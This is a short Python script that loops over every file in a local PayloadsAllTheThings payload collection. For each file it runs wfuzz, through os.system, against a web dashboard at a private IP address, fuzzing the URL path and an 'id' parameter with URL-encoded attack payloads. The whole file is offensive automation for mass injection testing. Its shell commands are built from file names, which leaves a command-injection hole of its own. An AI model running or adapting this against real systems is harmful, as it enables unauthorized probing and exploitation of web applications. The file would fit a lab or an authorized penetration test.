#!/usr/bin/python3

import os
import subprocess

#path = input("Enter payload path: ")
#path = "/home/danzhu/attack-payloads"
path = "/home/danzhu/PayloadsAllTheThings-master"
url = "http://192.168.120.6/dashboard/"

if not os.path.exists(path):
    print('Path must be exist! ', path)
    pass
   
# traverse root directory, and list directories as dirs and files as files
for root, dirs, files in os.walk(path):
    path = root.split(os.sep)
    #print(os.path.basename(root))
    for name in files:
        fullname = os.path.join(root, name)
        args1 = ("wfuzz -c -z file --zP fn='{0}',encoder=urlencode -t 20 --no-cache {1}FUZZ".format(fullname, url))
        args2 = ("wfuzz -c -z file --zP fn='{0}',encoder=urlencode -t 20 --no-cache {1}?id=FUZZ".format(fullname, url))
        #subprocess.run(['/usr/bin/wfuzz',args])
        os.system(args1)
        os.system(args2)
        #print(args)
